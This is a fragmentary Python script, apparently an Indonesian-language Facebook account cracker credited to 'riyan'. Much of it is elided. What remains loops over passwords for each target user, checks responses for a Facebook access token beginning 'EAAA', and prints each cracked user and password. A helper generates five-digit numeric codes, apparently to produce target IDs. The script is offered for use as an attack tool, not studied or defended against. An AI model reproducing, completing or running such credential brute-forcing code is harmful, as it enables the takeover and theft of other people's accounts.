#Coded by riyan (fb.me/itsmeriyan)
  ...
  try:
    for pw in passs:
      ...
      if re.search('(EAAA)\w+', str(response.text)):
        ...
        print('  [SESI] %s -> %s '%(str(user), str(pw)))
        break
  except: pass
...
def random_numbers():
  ...
  exit('  Nomor harus 5 digit ya ga boleh kurang.') if len(kode) < 5 else ''
  exit('  Nomor harus 5 digit ya ga boleh lebih.') if len(kode) > 5 else ''
  jml=int(input('''
...
pilih() if __name__ == '__main__' else exit('Maaf ada yang error , silahkan coba lagi yahh.')
